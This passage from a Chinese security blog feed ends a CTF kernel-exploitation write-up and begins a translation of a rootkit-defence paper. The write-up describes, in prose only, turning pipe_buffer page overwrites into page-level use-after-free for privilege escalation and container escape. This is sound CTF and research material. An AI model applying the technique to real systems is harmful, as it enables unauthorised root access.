<code>msg_msg</code> 所在 slub 页面便还是有一定几率挨到一起（由于大小 0x1000 的 <code>msg_msg</code> 所在 slab <strong>同样来自于 order-3</strong>，因此实际上仅纯堆喷也有一定的几率使得对应 slab 挨在一起）</p><p>TeamGoulash 的解法前半段与官方解法的中段基本上是一致的，即利用  <code>fcntl(F_SETPIPE_SZ)</code> 改大  <code>pipe_buffer</code> 到 order-3 后通过对 page 指针的 partial overwrite 构造 page-level 的 UAF，之后在 UAF page 上分配新的 <code>pipe_buffer</code> ，不过他们并没有像笔者那样继续构造自读写管道来完成内存空间任意读写，<strong>而是将 UAF page 分配为新进程的页表页面</strong>（由于 COW 机制，<code>fork()</code> 创建新进程的过程中其实仅会分配新的页表项及其他内核结构体，这使得我们有不小的概率使 UAF 页面被复用为页表中的某一级页面），之后<strong>将 busybox 映射到 UAF 页表项对应的内存空间，从而完成越权写入</strong>，由于缺乏有效的堆风水手段以及页分配的不稳定性导致<strong>成功率较低</strong>（毕竟分配过程当中还是有非常多的噪音，据该战队自述成功率只有 5%）</p><blockquote><p>以及 TeamGoulash 为笔者展现了一个很有趣的操作：通过睡眠一定的时间使得旧的 TLB 无效化</p><p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash 在 WP 中的表情.jpg"></p></blockquote><p>两只战队的解法大体上其实都在预期之内（笔者一开始想的就是利用 <code>msg_msg</code> ），同时这道题目没有出现去年那样的大面积非预期情况，可喜可贺可喜可贺👏👏👏</p><h1 id="0x04-总结与反思"><a href="#0x04-总结与反思" class="headerlink" title="0x04. 总结与反思"></a>0x04. 总结与反思</h1><p>毫不谦虚地说，笔者认为自己出的这道题目在对于内核中内存损坏类型漏洞的 “通解” 的探索相比<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP">去年</a>而言是有着一定距离的突破的——我们成功在一个非常极端的环境下完成了内核漏洞利用</p><p>而如果将官方解在不同漏洞场景下进行推广，得益于 <code>pipe_buffer</code> 大小的可调节性以及无需 <code>bzImage</code> 信息便能完成提权的便捷性，我们不难发现的是<strong>这个方法可以被很快地应用并推广到绝大部分的漏洞上，并在真实场景下完成漏洞利用</strong>，这也是为什么笔者要魔改《eva：终》的宣传语来作为题目描述——<strong>我们或许真的为内核内存损坏型漏洞找到了一种足够强大的通法：）</strong></p><p>不过这种方法并非是笔者第一个发现的（虽然笔者一开始确乎这么以为），据笔者了解类似的改写 <code>pipe_buffer.page</code> 的方法似乎早已被应用到实战的安卓攻防当中，同时<a href="https://interruptlabs.co.uk/labs/pipe_buffer/">来自 Interrupt Labs 的研究员也在去年发现了这种方法</a></p><blockquote><p>该 Lab 的安全研究员一开始也以为自己独立发现了一种新方法，结果一看 <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf">BlackHat 上好像讲过在安卓上已经存在在野利用了</a>，<del>和笔者同病相怜属于是</del></p></blockquote><p>虽然说这种方法似乎没有被正式命名，但是既然早就存在在野利用的话那自然笔者是没有命名资格了，至少笔者不会为了所谓 “青史留名” 而擅自将这种早就出现过的利用方法冠上自己的名字（笑）</p><!--glibc 利用近几年国内新出现的少数几个所谓 “house of xx” 在笔者看来真的是难以形容......这也是笔者为什么最近基本上没有在做常规的 Linux 用户态 pwn 的缘故（当然虚拟化逃逸还是挺有意思的），新出现的一些东西有点过于浮躁且浮夸了：( \n当然这并不代表笔者认为这些人或是这些事情恶心，也不代表笔者对这样的现象的一种批判--><p>总的来说，笔者对于自己今年所出的这一道题还是挺满意的，希望未来能够给大家带来更多更有趣的内核漏洞利用手法 ：）</p><h1 id="0xFF-一些小彩蛋"><a href="#0xFF-一些小彩蛋" class="headerlink" title="0xFF. 一些小彩蛋"></a>0xFF. 一些小彩蛋</h1><blockquote><p>笔者个人发疯部分，这里可以不用看了（笑）</p></blockquote><p>最近写论文写得快疯魔了，所以笔者为这道题目也简单写了一段：）</p><blockquote><p>《<strong>EvilPipe: Another General Exploitation Method On Linux kernel Vulnerabilities</strong>》</p><p><strong>Abstract</strong></p><p>在实战中对 Linux kernel 的内存损坏漏洞进行利用往往需要面临诸多挑战，来自硬件与软件层面的诸多保护使得漏洞利用变得困难，内核镜像信息的缺失也令合法攻击载荷的构造变得不可能；现有的一些工作也在尝试寻找无需进行控制流劫持的更具有通用性的攻击手法，如 Pipe Primitive 选择将漏洞形式转换为 DirtyPipe 完成利用，DirtyCred 则将漏洞转换为对内核中的 credentials 结构体的改写以完成利用；但这些利用手法往往仍需要一定级别的权限（例如，至少需要能够读取或执行特权文件），仍然缺乏足够的通用性</p><p>本文介绍 EvilPipe——一种更具有通用性的利用手法，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力，并能完美绕过包括 KASLR、SMEP、SMAP 在内的多项主流缓解措施；有了 EvilPipe，一个恶意的本地攻击者可以在无需内核镜像信息的情况下通过已知的内核漏洞完成提权与容器逃逸；我们在多个保护完备的 Linux 系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估，并发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术的通用性；在完成可用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的</p><p><strong>KEYWORDS</strong></p><p>OS Security; Kernel Exploitation; Privilege Escalation</p><p><strong>1 INTRODUCTION</strong></p><p>现如今 Linux 已然成为全世界最为流行的开源操作系统，得益于其开源的特性与优秀的设计，我们可以在包括云服务器、移动设备、物联网设备、网络基础设施在内的绝大部分设备上看到 Linux 内核的身影，而极高的流行性也令 Linux 吸引了无数网络攻击者与黑客们的兴趣。虽然 Linux 内核每年被爆出的漏洞高达数百个[3]，但在实战中对内核漏洞的利用往往面临着一系列困难的挑战。从内核层面而言，诸如 KASLR[1]、KPTI [2]、 CFI[4] 等保护为控制流劫持攻击增添了不少难度。从硬件层面而言， SMEP、SMAP、NX-bit 等保护也令形如 ret2usr[5]、ret2dir[5] 这样的攻击变得极为困难。内核镜像信息的缺失更是使得攻击者无法获取到内核代码片段的具体信息，从而使得类似 ROP&#x2F;JOP 这样的利用手法难以被应用。</p><p>相较于劫持内核的执行流，在实战中更受人青睐的内核漏洞则是无需特定于某个内核二进制信息的逻辑类漏洞。曾经非常火热的 CVE-2016-5195（也被称为 “DirtyCOW”）便是一个非常经典的这样的逻辑漏洞，其通过 Linux 内核中的条件竞争漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的诸多安全机制，这使得这个漏洞能够适用于实战中的多个不同的复杂场景。CVE-2022-0847（也被称为“DirtyPipe”）由于其类似的通用性于去年在安全界变得流行，其为一个对 pipe 结构体中标志位的错误设置，这可以使得攻击者利用该漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的多种保护。</p><p>在本文中我们提出了一种更为通用、强大的利用方法，称之为 EvilPipe。这项技术利用了内核中管道结构体的可重分配性与高度灵活性，这允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的近乎无限的对物理内存的任意读写能力，这意味着我们可以通过这种利用方法获取对内核的完全控制权，从而无需直接对抗任何主流的保护措施便能完成内核提权与容器逃逸的工作。同时，这项技术并不需要任何更高的系统权限（例如，读取 &#x2F;etc&#x2F;passwd），也不依赖于系统环境中的任何特权文件（例如， pkexec），且不需要任何额外的特定于内核镜像的内核信息，这意味着我们可以在绝大部分存在已知漏洞的Linux系统上直接应用这种利用手法完成攻击，因此这种方法在实战当中具有极高的可用性。</p><p>相比于其他的利用技术， EvilPipe 有着如下优点。首先，EvilPipe 的核心仅是 pipe 系统调用，作为一个基础设施 pipe 系统调用在每一个基于 Linux 的系统上都是可以使用的，这意味着 EvilPipe 近乎不存在任何的使用门槛。其次，EvilPipe 有着高度的灵活性，可以完美契合多个不同大小的内核漏洞对象。对于 UAF 漏洞而言，EvilPipe 仅要求漏洞对象与通用的 GFP_KERNEL_ACCOUNT 分配标志位来自同一 kmem_cache（内核当中的大部分对象都满足该要求）。对于溢出漏洞而言，EvilPipe 的最低要求仅为一个 \0 字节（这同样适用于跨 kmem_cache 间内存页的溢出，我们将在后文使用一种名为页级堆风水的技术来完成它）。这意味着我们可以将绝大部分的内存损坏类漏洞转换为 EvilPipe 以完成利用。最后，EvilPipe 不直接与任何的内核保护措施进行对抗，也不需要关于当前内核的任何信息，且不会留下任何痕迹，这意味着 EvilPipe 可以被应用于近乎所有的攻击环境。</p><p>此外，我们认为 EvilPipe 并不仅代表针对 pipe 系统调用的利用方法，而是代表了与传统的漏洞利用技术所不同的研究方向：将内核漏洞利用方法从传统的代码执行转向构造逻辑漏洞，从而无需直接与众多内核保护措施进行直接对抗，并大幅减少漏洞利用对特定于指定环境的依赖度。我们认为在漏洞利用上这是一个值得令人探索的方向。</p><p>在完成概念验证之后，我们将多个 Linux 内核中的内存损坏漏洞改写为 EvilPipe，并在多个保护完备的 Linux 系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估。我们发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术具有强大的能力。在完成可利用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的。</p><p>总而言之，本文做了如下工作：</p><ul><li>我们提出了一种新的通用利用技术——EvilPipe，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力</li><li>我们在多个真实世界的漏洞上应用了 EvilPipe ，这展示了其强大的通用性与易用性。同时我们发现了一些可能应用类似于 EvilPipe 的逻辑攻击手法的内核对象。</li><li>我们分析了 Linux 内核现有的防御机制在对抗逻辑漏洞上的不足，并提出了新的保护机制。我们对这项新机制进行了评估，发现其带来的负担是可以忽略不计的。</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;「さらば、全てのリヌクス カーネル エクスプロイテーション。」&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="D^3CTF" scheme="http://blog.arttnba3.cn/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="http://blog.arttnba3.cn/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="http://blog.arttnba3.cn/tags/Cross-Cache-Overflow/"/>
    
    <category term="Page-level Heap Fengshui" scheme="http://blog.arttnba3.cn/tags/Page-level-Heap-Fengshui/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x02】论文笔记：Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions </title>
    <link href="http://blog.arttnba3.cn/2023/04/14/PAPER-0X02_VTW/"/>
    <id>http://blog.arttnba3.cn/2023/04/14/PAPER-0X02_VTW/</id>
    <published>2023-04-13T17:46:35.000Z</published>
    <updated>2023-04-19T18:18:37.640Z</updated>
    
    <content type="html"><![CDATA[<p>任何 rootkit，终将绳之以法！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者的毕业设计完成的要求之一便是需要完整翻译一篇与该领域相关的论文，刚好笔者做的是反病毒相关的，因此就选了<a href="https://ieeexplore.ieee.org/document/9186825">《Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions》</a>这篇论文</p><p>本篇博客说是论文笔记，其实就是<strong>一篇完整的论文翻译：）</strong></p><blockquote><p>不过在笔者翻译完之后才发现作者似乎是华人，<del>感觉有点亏了，毕竟主要是出于翻译的目的，但是却没能体会到原汁原味的 native speaker 的论文</del></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>如今 Linux 服务器已被在几乎所有的云、数据中心与超级电脑上使用。Linux 内核功能正面临着一种称之为 <code>rootkits</code> 的带有 root 访问权限的恶意软件攻击。rootkits 在如今的 Linux 服务器上以 <em>可装载内核模块</em> （Loadable Kernel Modules，LKM）的形式出现。这些模块隐藏于其他的内核对象之间，且可以通过篡改内核服务函数所需的元数据来重定向内核控制流。内核 rootkits 在载入后对用户是不可见的，这可能绕过大部分的安全防护。rootkits 在时间与空间上的表现都是分散的，这使其变得难以被发现或移除。为了解决 rootkit 的威胁，我们提出了一种通用的 <em>虚拟墙</em> （Virtual Wall，VTW）方案以通过跟踪所带来的内核活动来过滤出嵌入了 rootkit 的 LKMs。这种 VTW 本质上是一个带有 rootkit 检测与时间追踪能力的轻量级 hypervisor。通常情况下 Linux 在 Guest 模式下运行，当一个 LKM 的执行损害了 VTW 所设置的安全策略时，OS 控制权将转换到 Host 模式，在 Host 模式的 VTW 及时地启用检测并跟踪 rootkit 事件。换言之，潜在的 rootkit 攻击会被检测、被追踪并被分类以做出有意义的过滤决策。整个检测与追踪过程基于内存访问控制与事件注入机制。实验性质的结果展示了 VTW 防护系统在及时检测与防御内核 rootkit 上是高效的，且执行 VTW 的 CPU 开销小于 2%。相较于其他的防护机制（如 DIKernel 等），我们的 vs 更容易以低性能开销应用于 Linux 服务器。我们还会将我们的系统与七个其他的 rootkit 防御系统进行对比。</p><p><strong>Index Terms</strong>——访问控制，数据完整性，操作系统安全，内核保护与系统架构。</p><h1 id="1-Introduction"><a href="#1-Introduction" class="headerlink" title="1 Introduction"></a>1 Introduction</h1><p>由于内核 rootkit 的高权限与因此特性，其被广泛应用于 Linux 服务器的内核攻击中。如今已知的内核 rootkits 大都以 <em>可装载内核模块</em> （Loadable Kernel Modules，LKM）的形式出现，这些模块可以重定义内核内容函数、隐藏自身并隐藏目标对象。</p><p>可隐藏的特性允许内核 rootkit 通过 “基于 host 的” 架构绕过安全工具。自从这些工具更低的权限限制了他们的检测范围，更糟糕的是他们基于 <em>目标操作系统</em> （target operating system，TOS）环境，这导致检测结果的可靠性必须基于 TOS 的完全安全。不幸的是，内核 rootkit 可以偷偷篡改 TOS 环境以破坏其安全。</p><p>为了实现他们的功能，内核 rootkit 需要篡改内核对象。内核 rootkit 的操作对象包括多种数据，例如控制数据、非控制数据、静态数据与动态数据。理论而言，内核安全可以通过限制所有对指定内核数据的窜改来确保。</p><p>然而，不同的数据通常在内核空间中分散存储，带有不同特性的数据可能会存放在同一张内存页中。因此，基于页的保护机制无法在不影响其他内核数据的情况下保护目标数据。</p><p>在攻击中，内核 rootkit 需要篡改的内核数据通常仅有几字节。同时，最小的内存权限管理粒度为一张页，其通常占用 4KB。也就是说，为了保护数个字节，我们需要限制所有可执行实体对目标数据所在页的写操作。</p><p>在数据大小与保护粒度间的不匹配破坏了其他内核对象的原始属性，这影响了相关的执行实体的功能与表现。例如，内核数据结构中的 VFS 函数指针条目通常为内核 rootkit 要篡改的目标数据。尽管该条目并不会被动态更新，与其共址的状态描述条目可能会在执行实体运行时被更新。若对状态描述的写权限被限制，则关联的执行条目将被影响。</p><p>内核 rootkit 有着所有的 LKM 特性，他们可以调用自定义函数或装载 rootkit 的导出函数以篡改内核数据。他们可以在装载时或是在他们生命周期的任何时刻启动一次攻击。因此，内核 rootkit 可以是任何将被或已被装载的 LKM，参与到一次攻击的内核 rootkits 便可能是一个或多个 LKMs。</p><p>从时间层面，内核 rootkit 的攻击时间是随机的；从空间层面，在一次攻击中的参与者是分散的。这两种特性使得内核 rootkit 的攻击事件难以预测、攻击的参与者难以追踪，这极大地影响了系统安全。</p><p>攻击开始时间的随机性使得基于单个或周期性的检测仅能达到时候检测的效果。当这些方法被执行时，内核 rootkits 的攻击可能已经完成了，甚至所有的 rootkits 都可能被移除了。结果便是，他们的检测与防护效果将被极大地影响。内核 rootkits 间的依赖关系使得攻击的形式更加多样化。</p><p>透过依赖关系，内核 rootkit 可以连接多个 LKMs 以用作内核攻击。现有的安全方案仅能检测当前攻击的直接发起者，但无法识别在整个攻击过程中的其他参与者。未被检测的攻击者将一直潜伏于操作系统中，等待条件成熟时再次发起攻击。</p><p>我们提出了一种内核 rootkit 过滤方法 VTW 以保护内核功能，例如系统调用表、内核只读对象、LKM 状态描述符、<code>&quot;proc&quot;</code> 文件函数指针、网络文件指针等。这种方法使用 Intel VMX 技术以将操作系统分为两种模式：“host” 与 “guest”。</p><p>跨过两种执行模式，我们为压紧内核 rootkits 创建了检测、预防、跟踪策略。本论文的主要贡献总结于如下四个技术层面：</p><p>1） 建立了一个轻量级的 hypervisor。其使用 Intel VMX 技术来重构系统执行模式，使得对内核资源的访问更能被检测到。</p><p>2） 建立了一个资源访问控制机制。其可以感知对目标内存访问的感知、限制、操控，且支持我们在 “guest” 模式下监控与控制执行路径。</p><p>3） 建立一个控制流跟踪机制。该机制支持跟踪不同 LKMs 的控制流跳转与返回。</p><p>4） 创建了一个检测、防护、跟踪内核 rootkits 的安全框架。通过上述架构与机制，内核 rootkits 攻击可以被检测与防护。这是第一次有一种跟踪单次攻击中所有参与的内核 rootkits 的方法被开发。</p><h1 id="2-Related-Previous-Work"><a href="#2-Related-Previous-Work" class="headerlink" title="2 Related Previous Work"></a>2 Related Previous Work</h1><p>由于其良好的抗干扰能力，基于虚拟化的内核保护方法已经受到了额外的关注。尤其是对内核 rootkits 而言，这些方法展示了出色的优点。他们可以被分为两种：入侵式方法与非入侵式方法，前者需要向 <em>目标虚拟机</em> （target virtual machine，VTW）注入额外的内容以获取所需信息而后者不需要。</p><p><em>侵入式方法</em> （Intrusive Methods）。由 Sebastion 最先提出的 X-TIER 将一个内核模块插入到目标虚拟机，接下来其通过模块来读取 TVM 数据结构以获取其状态信息。在这之后 X-TIER 通过 hypercall 将所需信息传递给 hypervisor。</p><p>SYRINGE 使用函数调用注入技术来在 TVM 外启用对 TVM 函数的调用，与此同时局部牧羊技术被用于检测控制流完整性。</p><p>Virtuoso 继续从控制逻辑的角度获取 TVM 状态信息。其在 TVM 中多次运行程序并提取相关指令与相关执行路径，之后生成内省代码所需的路径被翻译，最后 Virtuoso 将所有的信息翻译成可以在 TVM 外进行语义重构的代码。</p><p>X-TIER、SYRINGE、Virtuoso 通过分析物理内存并以其作为真实视角而获得语义视角。他们可以通过对比真实的语义视角与 TVM 的内部视角来找到隐藏的对象，如进程与文件。若存在一个隐藏对象，则他们断定 TVM 已经被破坏而一个内核 rootkit 可能存在于 TVM 中。VMST 在 rootkit 检测上使用同样的方法。</p><p><em>非入侵式方法</em> （Non-Intrusive Methods）。VMwatch 的第一步是获取 TVM 的内存，之后使用 TVM 的内核数据结构作为模板来理解内存所表示的操作性状态。</p><p>与 VMwatcher 不同，RTKDSM 为一个实时系统，其可以被分为两部分：内省代理与监控代理，前者放置在一个安全的虚拟机中，后者则放置在 hypervisor 中。RTKDSM 可以通过交叉对比来对数据结构进行实时监控。</p><p>上述方法可以被用以检测被内核 rootkits 隐藏的对象，然而这些方法基于如 Xen 的巨型虚拟化平台，且需要克服虚拟机内省的语义缺陷。结果便是，他们向操作系统引入了一个显著的性能开销。</p><p>例如，RTKDSM降低了一些应用 110% 的执行速度。SYRING 在系统调用上延迟到 51ms，这对系统调用而言是一个显著的性能开销。除了 RTKDSM，没有任何的上述方法可以实时监控与检测操作系统。</p><h1 id="3-Virtual-Wall-Architecture"><a href="#3-Virtual-Wall-Architecture" class="headerlink" title="3 Virtual Wall Architecture"></a>3 Virtual Wall Architecture</h1><p>VTW 是一个带有内核 rootkit 防护功能的轻量级 hypervisor。本节我们将介绍其总体架构。</p><h2 id="3-1-Assumptions-and-Notational-Definition"><a href="#3-1-Assumptions-and-Notational-Definition" class="headerlink" title="3.1 Assumptions and Notational Definition"></a>3.1 Assumptions and Notational Definition</h2><p>我们假设攻击者可以将一个 LKM 注入到 TOS 中。现实中，攻击者可以通过应用漏洞提高权限并通过后门来控制 TOS，之后一个 LKM 可以被注入到内核。我们同样假设 TOS 与非恶意执行实体不会非法篡改内核数据与内核控制流。此外，本论文所用定义展示于表 1 中。</p><h2 id="3-2-Design-Objectives"><a href="#3-2-Design-Objectives" class="headerlink" title="3.2 Design Objectives"></a>3.2 Design Objectives</h2><p>VTW 被设计为带有如下指定的三个技术需求：</p><p>1） <em>实时检测</em> （Real-time Detection）。内核 rootkits 可能在模块加载阶段启动一次攻击，或是在模块位于内存中的时间中的任何时间。若检测在 LKM 被载入后或被移除后完成，则检测结果可能不精确，浙江影响后续的检测与追踪。因此，VTW 需要在模块载入完成前或在其生命周期中检测 rootkits 的有害操作以保护内核数据的完整性。</p><p>2） <em>高效防护</em> （Effective Defence）。rootkits 操作的内核对象包括静态与动态的内核数据。对于静态内核数据，VTW 需要确认他们未被篡改。对于动态内核数据，VTW 需要确保他们在被篡改后可以被恢复。</p><p>3） <em>综合可追踪性</em> （Comprehensive Traceability）。攻击代码可能在 rootkit 所属内存空间中，也可能在 rootkit 所依赖的其他模块的代码空间中。VTW 需要定位所有与当前有害操作相关的 LKMs。</p><h2 id="3-3-System-Architecture-of-Virtual-Wall"><a href="#3-3-System-Architecture-of-Virtual-Wall" class="headerlink" title="3.3 System Architecture of Virtual Wall"></a>3.3 System Architecture of Virtual Wall</h2><p>VTW 的防护过程如 图.1 所示。防御模式需要通过初始化来建立，之后应用访问控制方案，最后同时连带完成检测与跟踪以在 rootkit 过滤中进行高速决定。</p><p><img src="https://s2.loli.net/2023/04/06/XyHTQfdiP9YZk7S.png" alt="图.1 virtual wall 操作过程"></p><p>VTW 的架构如 图.2 所示。VTW 由 ModeHandler、MemHandler、ControlHandler、SPE（Security Policy Engine，安全策略引擎）组成。ModeHandler 的任务是确保在 “guest” 与 “host” 模式之间的正常模式切换。</p><p><img src="https://s2.loli.net/2023/04/06/ZrhVFxDmM3gERbI.png" alt="图.2 VTW 防护系统架构"></p><p>MemHandle 的任务是通过建立一组独立的地址页表来从 “guest” 上隔离安全内容物。此外，其借用 EPT （译注：Extend Page Table，扩展页表）来实现 VTW 的自我防护与透明部署。ControlHandler 完成 rootkit 的检测、预防、分析。</p><p>SPE 为每个内容物提供安全策略，例如为静态内核数据提供权限设置、为动态内核数据提供合法性约束、为控制流提供追踪路径。所有对 SPE 的损坏都将导致操作系统从 “guest” 陷入 “host”。</p><h3 id="3-3-1-Resetting-of-OS’s-Privilege-Mode"><a href="#3-3-1-Resetting-of-OS’s-Privilege-Mode" class="headerlink" title="3.3.1 Resetting of OS’s Privilege Mode"></a>3.3.1 Resetting of OS’s Privilege Mode</h3><p>ModeHandler 使用 Intel VMX Non-Root 与 Intel VMX Root 来将原生操作系统分为 “guest” 与 “host” 模式。这两种模式将 ring0 分为两个特权级，称为完全型 ring0 与限制型 ring0。在 “host” 模式下，VTW 位于完全型 ring0 级，可以完全接管内核控制流。在 “guest” 模式下，内核位于限制型 ring0 级，任何损坏 SPE 的行为都将造成操作系统陷入到 “host” 模式。</p><p>在 图.3 中，ProtectionWall为 ModeHandler 与 MemHandler 的功能属性的抽象，KernelProtector 为 ControlHandler 的功能属性的抽象。</p><p>若 guest 模式下的一条指令会损坏安全策略，则其将造成操作系统切换到 host 模式。ProtectionWall 将拒绝所有在 guest 模式下的操作并唤醒 KernelProtector 使用 SPE 处理该攻击。</p><p><img src="https://s2.loli.net/2023/04/06/Qt4skOVGPNJcLS2.png" alt="图3. Linux 内核操作中在 guest 与 host 模式间的条件跳转"></p><h3 id="3-3-2-Creating-Private-Page-Tables"><a href="#3-3-2-Creating-Private-Page-Tables" class="headerlink" title="3.3.2 Creating Private Page Tables"></a>3.3.2 Creating Private Page Tables</h3><p>MemHandler 为 host 创建一组私有页表以分割两种模式的地址空间，私有页表的创建条件如 表2 所示。</p><p>存储与内核数据段中的内核数据 $swapper_pg_dir$ 指向内核地址空间的页目录，所有执行实体的内核地址空间基于 $swapper_pg_dir$ 构建。在 表2 中，所有私有页表组成一个元组 $\rho$  ，且所有由 $swapper_pg_dir$ 指向的页表组成一个元组 $\varepsilon$ （①~②）。</p><p>当 MemHandler 被初始化，其会根据 $\varepsilon$ 创建页目录表（$h_pml4e$）、页顶级目录（$h_pdpte$）、页中间目录（$h_pde$）、页表（$h_pe$）。</p><p>我们首先基于页表集 $\rho$ （③）的内存 $V_{22}$ 创建一份等量的内存 $V_{1}$ ，接下来我们使用每个 $h_pdpte$ 的物理内存填充 $h_pml4e$ 的条目、使用每个 $h_pde$ 的物理内存填充 $h_pdpte$ 的条目、使用每个 $h_pe$ 的物理内存填充 $h_pde$ 的条目。</p><p>最后，MemHandler 拷贝 $\varepsilon$ 的最后的页表中所有的页条目至 $h_pe$ 。当 “host” 中出现一个页表错误时，VTW 根据 $\varepsilon$ 更新错误的页表。</p><p>为了确保 VTW 的透明性，MenHandler 建立了一种 EPT 重定向方法，该方法使得 VTW 的内容对 “guest” 而言是不可见的。其根据 VTW 的每个内容物的物理内存重定向 EPT 的页表项至一个被设为可读、可写、可执行（⑧~⑩）的空页。当 “guest” 中的实体想要访问 VTW 的物理内存时，被访问的内存为一个 <em>“$伪页$”</em> （pseudo page）。</p><p>由于整个内核共享一个相同的地址空间，每个执行实体可以映射包括 VTW 在内的所有内核内容。因此，VTW 不需要任何过程便能被检测与分析。若我们仅仅删除了寻址 VTW 的 EPT 条目，则当一个实体探索内核地址空间时，操作系统将不断地陷入 “host”。</p><p>一方面，频繁的陷入将影响执行效率；另一方面，异常的内存访问时间与空间将使得攻击者推断出 VTW 的存在。将 VTW 的所有地址空间重定向至伪物理页面可以排除由内存探测造成的时间与空间异常，这增强了 VTW 的透明性。</p><h1 id="4-Resource-Access-Control"><a href="#4-Resource-Access-Control" class="headerlink" title="4 Resource Access Control"></a>4 Resource Access Control</h1><p>VTW 通过 MemHandler 控制内存访问。MenHandler 使用 EPT 来控制 “guest” 模式中的内存访问。通过 EPT 提供的内存权限管理，我们可以感知、跟踪、控制 “guest” 对所有内存页面的访问。MenHandler 可以非常简便地通过设置 EPT 最后一级的权限位来部署。</p><p>为了达成对内核更细粒度的访问控制，ControlHandler 建立了一个包括设置断点、注入通用保护异常、执行单步调试的事件注入机制。我们将在本节描述这些，并展示于 表3 与 “资源访问控制过程”（Resource Access Control Procedure）。</p><h2 id="4-1-Conditioning-for-Resource-Access-Control"><a href="#4-1-Conditioning-for-Resource-Access-Control" class="headerlink" title="4.1 Conditioning for Resource Access Control"></a>4.1 Conditioning for Resource Access Control</h2><p>表3 为设置资源访问控制的条件。①<del>⑨用于设置断点，断点的类型可以依据目标对象分为指令与数据断点。ControlHandler 使用 Dr0</del>Dr3（断点地址寄存器于集合 $DeReg$ 中）与 DR6<del>DR7 （断点管理寄存器，于集合 $DeCon$ 中）来设置不同类型的断点（①</del>②）。</p><p>在设置一个指令断点时，首先通过函数 $SetDeReg$ 将指令地址（ $Iaddr$ ）写入到断点地址寄存器（③），接下来 Dr7 对应的 R&#x2F;W 位被设置为 01（数据写中断），对应的 LEN 位被设置为 10 （数据大小为 8 字节），如 ⑦<del>⑧所示。在完成断点设置之后，ControlHandler 同样需要清除 Dr6 （⑨）的 B0</del>B2 （位 2:0)。</p><p>为了控制 “guest” 的执行，ControlHandler 为操作系统设置单步执行调试。ControlHandler 首先读取 VMCS 中 guest 状态域中的 EFLAGS 的内容，记录目标信息（⑬）。接下来其将 EFLAGS.TF （陷阱标志位）设置为1（⑭），这将处理器设为单步执行模式。最后，ControlHandler 将修改后的内容再次写入 EFLAGS。最后 Dr6 的 BS（位 14）被设为 0。</p><h2 id="4-2-Resource-Access-Control-Procedure"><a href="#4-2-Resource-Access-Control-Procedure" class="headerlink" title="4.2 Resource Access Control Procedure"></a>4.2 Resource Access Control Procedure</h2><p>该程序用以控制指令执行与数据访问。步骤 1<del>4用以获得断点，步骤 5</del>6 用以堵塞 “guest” 中的目标指令，步骤 7~8 用以在执行目标指令后获取操作系统的状态。</p><p><img src="https://s2.loli.net/2023/04/08/OVLpw5DtBHcr4PJ.png" alt="image.png"></p><p>当一个执行实体像一个断点位置写入数据（步骤1<del>2）或是在 “guest” 模式下执行一个断点指令（步骤 3</del>4），其会触发到 “host” 模式的模式切换（$SysMod$）。Dr6 中的 B0 ~ B2 被用以区分断点的位置。通过设置断点，VTW 实现了字节级别的资源访问。</p><p>当一个通用保护被设置，运行在 “guest” 模式下的操作系统将生成一个 #GP 异常，由此当前操作将会被阻塞（步骤 5~6）。当单步调试启用，操作系统将在 “guest” 下执行任意指令后触发一个调试异常并陷入到 “host” （步骤 7 ~ 8 ）。通过设置单步调试，我们可以为操作系统实现指令粒度的资源访问控制，并通过 $get_status$ 获得由每条指令所造成的对操作系统状态的改变。</p><h1 id="5-Rootkit-Defense-Strategies"><a href="#5-Rootkit-Defense-Strategies" class="headerlink" title="5 Rootkit Defense Strategies"></a>5 Rootkit Defense Strategies</h1><p>我们依据攻击时间将内核 rootkits 的攻击分为三类。第一类中 rootkits 在加载时攻击内核，其会通过 $module_init()$ 调用特定函数以实现他们的攻击。</p><p>内核 rootkits 的有害行为可能在以上三类攻击中的其一或数个中出现，同时与当前攻击所关联的 rootkit(s) 可能会是正在被加载的 